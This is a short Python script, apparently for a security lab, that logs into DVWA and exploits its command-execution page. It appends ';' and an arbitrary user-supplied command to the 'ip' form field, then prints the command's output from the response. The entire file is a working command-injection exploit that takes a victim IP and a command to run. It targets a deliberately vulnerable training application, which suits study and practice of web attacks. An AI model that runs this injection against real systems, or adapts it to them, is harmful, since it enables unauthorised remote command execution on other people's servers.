#!/usr/bin/env python
import argparse
import mechanize
import cookielib

def main(username,password,victim_ip,cmd):
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_cookiejar(cj)
	br.open("http://" + victim_ip + "/dvwa/login.php")
	br.select_form(nr=0)
	br["username"] = username
	br["password"] = password
	br.submit()

	br.open("http://" + victim_ip + "/dvwa/vulnerabilities/exec/#")
	br.select_form(nr=0)
	br["ip"] = ";" + cmd
	response = br.submit()
	uglyhtml = response.read()
	stdout = uglyhtml.partition('<pre>')[-1].rpartition('</pre>')[0]
	print stdout

parser = argparse.ArgumentParser(
	epilog='Example: cmdinjection.py admin password 127.0.0.1 id')
parser.add_argument("username", help="DVWA Login Username")
parser.add_argument("password", help="DVWA Login Password")
parser.add_argument("victim_ip", help="IP Address of Victim Machine")
parser.add_argument("cmd", help="CMD to execute")
args = parser.parse_args()
main(args.username,args.password,args.victim_ip,args.cmd)
